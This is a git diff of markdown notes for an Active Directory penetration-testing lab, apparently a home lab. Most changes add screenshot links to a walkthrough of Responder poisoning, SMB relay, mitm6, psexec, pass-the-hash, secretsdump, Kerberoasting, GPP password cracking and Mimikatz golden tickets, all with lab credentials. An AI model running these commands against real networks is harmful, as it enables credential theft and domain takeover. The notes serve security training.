@@ -18,7 +18,7 @@
     - pparker:Password1
 
 ### Windows 10 Enterprise
-
+![Alt text](assets/Picture1.png)
 - Set the DNS Server to DC IP: 192.168.31.90
 - Log in using MARVEL\administrator:P@$$w0rd!
 - Edit Local Users and Groups:
@@ -114,6 +114,7 @@ Define relationships between domains, allowing users in one domain to access res
 - Allows hosts to perform name resolution for hosts on the same local network without requiring a DNS server.
 - When a host's DNS query fails, it broadcasts an LLMNR query across the local network.
 - An attacker can listen for these queries and respond with its IP to redirect traffic, leading to relay attacks and credentials theft (username & NTLM hash).
+![Alt text](assets/Picture2.png)
 
 **Tools:**
 
@@ -124,11 +125,18 @@ Define relationships between domains, allowing users in one domain to access res
 ```bash
 responder -I eth0 -dwv
 ```
+![Alt text](assets/Picture3.png)
+
 
 **Steps:**
 
 - Login to THEPUNISHER VM with fcastle user and try to open WinExplorer and navigate to \\10.8.0.2 (Kali IP).
-- An event occurs and triggers LLMNR, captured by Responder, which receives the victim's username and password NTLMv2 hash.
+- An event occurs and triggers LLMNR
+  ![Alt text](assets/Picture5.png)
+- Captured by Responder, which receives the victim's username and password NTLMv2 hash.
+  ![Alt text](assets/Picture6.png)
+  ![Alt text](assets/Picture7.png)
+
 
 ### 2. SMB Relay
 
@@ -145,6 +153,7 @@ responder -I eth0 -dwv
 ```bash
 nmap --script=smb2-security-mode.nse -p445 192.168.31.90-93 -Pn
 ```
+![Alt text](assets/Picture8.png)
 
 **Setup:**
 
@@ -163,6 +172,7 @@ HTTP = Off
 ```bash
 responder -I eth0 -dwv
 ```
+![Alt text](assets/Picture9.png)
 
 - Use ntlmrelayx.py to perform SMB Relay attacks:
 
@@ -171,8 +181,10 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support -i
 ```
 
 - Login to THEPUNISHER VM with fcastle user and try to open WinExplorer and navigate to \\10.8.0.2 (Kali IP), triggering LLMNR, captured by Responder, and relayed by ntlmrelayx to targets.
+  ![Alt text](assets/Picture10.png)
+  ![Alt text](assets/Picture11.png)
 - Bind to the SMB shell:
-
+  ![Alt text](assets/Picture12.png)
 ```bash
 nc 127.0.0.1 11000
 ```
@@ -192,15 +204,16 @@ set smbuser fcastle
 set smbpass #Naruhina20
 run
 ```
-
+  ![Alt text](assets/Picture13.png)
+  
 **Using psexec.py:**
 
 ```bash
 psexec.py MARVEL.local/fcastle:'#Naruhina20'@192.168.31.93
 ```
-
 - Similarly, you can use smbexec and wmiexec.
-
+  ![Alt text](assets/Picture14.png)
+  
 ### 4. IPv6 DNS Takeover Attack
 
 - mitm6 exploits the default Windows config to take over the default DNS server by replying to DHCPv6 messages (acts as a legit DHCPv6 server), providing the victim with a link-local IPv6 address and setting the attacker's host as default DNS server.
@@ -212,10 +225,12 @@ sudo ntlmrelayx.py -6 -t ldaps://hydra-dc.MARVEL.local -wh fakewpad.MARVEL.local
 ```
 
 - Reboot THEPUNISHER VM and check the ntlmrelayx.py output.
+  ![Alt text](assets/Picture15.png)
 - Check lootme directory; it would contain data about domain users, computers, groups, policies, etc.
+  ![Alt text](assets/Picture16.png) 
 
 ### 5. Pass-Back Attack
-
+- More information about the attack : [MFP Hacking Guide](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)
 - Involves redirecting MFP's LDAP authentication to a malicious server to capture user credentials.
 - MFPs (Multi-Function Peripherals - printers, copiers) are often overlooked targets but can be exploited for serious security breaches.
 
@@ -224,10 +239,12 @@ sudo ntlmrelayx.py -6 -t ldaps://hydra-dc.MARVEL.local -wh fakewpad.MARVEL.local
 - Access the MFP's embedded web interface (EWS) using default or guessed credentials.
 - Change the LDAP server address to point to a malicious LDAP server you control.
 - When a user tries to scan/email something and logs in, the MFP sends their domain credentials to your fake server.
+- You capture those credentials (often in cleartext or base64 encoded).
 
 **Tools:**
 
 - PRET can be used to access MFP settings.
+
 
 ## Post Compromise Enumeration
 
@@ -289,6 +306,7 @@ sudo neo4j console
 - Log in (default Neo4j user/pass is neo4j:neo4j, then change it).
 - Drag the loot.zip into the BloodHound GUI to upload.
 
+
 ## Post Compromise Attacks
 
 ### I. Pass the Hash
@@ -297,8 +315,11 @@ sudo neo4j console
 
 ```bash
 crackmapexec smb 192.168.31.0/24 -u fcastle -d MARVEL.local -p Password1
+```
+```bash
 crackmapexec smb 192.168.31.0/24 -u fcastle -p Password1 -d MARVEL.local --sam
 ```
+  ![Alt text](assets/Picture17.png)
 
 - **secretsdump.py** - Dump hashes:
 
@@ -306,7 +327,8 @@ crackmapexec smb 192.168.31.0/24 -u fcastle -p Password1 -d MARVEL.local --sam
 secretsdump.py MARVEL.local/fcastle:'Password1'@spiderman.MARVEL.local
 secretsdump.py MARVEL.local/fcastle:'Password1'@thepunisher.MARVEL.local
 ```
-
+  ![Alt text](assets/Picture18.png)
+  ![Alt text](assets/Picture19.png)
 - **Hashcat** - Crack hashes (Note: Only NTLMv2 hashes can be relayed; NTLMv1 cannot).
   - Use `-m 1000` for NTLMv1.
 
@@ -332,7 +354,10 @@ secretsdump.py MARVEL.local/fcastle:'Password1'@thepunisher.MARVEL.local
 
 - **Delegate** - Created for logging into a machine or remote desktop.
 - **Impersonate** - “Non-interactive” such as attaching a network drive or a domain logon script.
-
+- 
+**After gaining access to the system:**
+  ![Alt text](assets/Picture20.png)
+  ![Alt text](assets/Picture21.png)
 **Mitigations:**
 
 - Limit user/group token creation permissions
@@ -340,7 +365,7 @@ secretsdump.py MARVEL.local/fcastle:'Password1'@thepunisher.MARVEL.local
 - Limit admin restriction
 
 ### III. Kerberoasting
-
+  ![Alt text](assets/Picture22.png)
 **Process:**
 
 1. User (Victim) asks the Domain Controller for a TGT and sends their NTLM hash.
@@ -357,8 +382,8 @@ secretsdump.py MARVEL.local/fcastle:'Password1'@thepunisher.MARVEL.local
 ```bash
 sudo GetUserSPNs.py MARVEL.local/fcastle:'Password1' -dc-ip 192.168.31.90 -request
 ```
-
-- Copy the krb5tgs hash and crack it using Hashcat.
+  ![Alt text](assets/Picture23.png)
+- Copy the `krb5tgs` hash and crack it using Hashcat.
 
 **Mitigations:**
 
@@ -375,12 +400,14 @@ sudo GetUserSPNs.py MARVEL.local/fcastle:'Password1' -dc-ip 192.168.31.90 -reque
 ```bash
 findstr /S /I cpassword \\marvel.local\sysvol\marvel.local\policies\*.xml
 ```
-
+![Alt text](assets/Picture24.png)
 - Use gpp-decrypt to crack the GPP hash.
+![Alt text](assets/Picture25.png)
 
 ### V. URL File Access
 
 - If you have compromised a machine and the user has any sort of file share access, you can use that access to capture more hashes from different users who access or hover over your URL file.
+![Alt text](assets/Picture26.png)
 
 ### VI. Credential Dumping with Mimikatz
 
@@ -397,8 +424,10 @@ python3 -m http.server 80
 **On the target Windows machine:**
 
 - Open http://192.168.31.131/mimikatz_trunk/x64/ in the browser and download all 4 files from the x64 directory.
+- You can dump NTDS.dit and crack passwords.
 - Run Mimikatz with `privilege::debug`.
-- Dump NTDS.dit and crack passwords.
+  ![Alt text](assets/Picture27.png)
+
 
 ### VII. Golden Ticket Attack using Mimikatz
 
@@ -407,14 +436,17 @@ python3 -m http.server 80
 ```bash
 lsadump::lsa /inject /name:krbtgt
 ```
-
+![Alt text](assets/Picture28.png)
 - Note the SID of the domain and NTLM hash of the krbtgt account.
 - Generate the golden ticket:
 
 ```bash
 kerberos::golden /User:MyAdministrator /domain:marvel.local /sid:S-1-5-21-1796002695-2329991732-2223296958 /krbtgt:21a84dbb8f81aa02316606b488a4a9eb /id:500 /ptt
 ```
-
+- `id:500` : Administrator account
+- `ptt` : pass the ticket into the session
+![Alt text](assets/Picture29.png)
 - Open a session using `misc::cmd`.
 - Now you can access the directories of THEPUNISHER and other machines.
+  ![Alt text](assets/Picture30.png)
 - You can also create an account and make it a domain admin.
